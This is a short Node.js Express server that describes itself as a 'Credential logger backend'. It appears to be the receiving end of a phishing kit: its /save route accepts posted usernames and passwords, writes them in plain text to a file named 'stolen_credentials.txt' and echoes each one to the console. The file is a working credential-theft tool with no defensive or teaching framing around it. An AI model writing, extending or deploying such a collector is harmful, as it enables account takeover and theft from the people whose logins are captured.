const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const HOST = '0.0.0.0';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Test route - open this in browser to check if backend is alive
app.get('/', (req, res) => {
    res.send('✅ Credential logger backend is running!');
});

app.post('/save', (req, res) => {
    try {
        const { username, password, timestamp } = req.body;

        if (!username || !password) {
            return res.status(400).send('Missing data');
        }

        const logEntry = `${timestamp || new Date().toISOString()} | Username: ${username} | Password: ${password}\n`;

        fs.appendFileSync('stolen_credentials.txt', logEntry);

        console.log('✅ Credentials saved:', logEntry.trim());
        res.send('OK');
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Server error');
    }
});

app.listen(PORT, HOST, () => {
    console.log(`🚀 Backend running on http://${HOST}:${PORT}`);
});
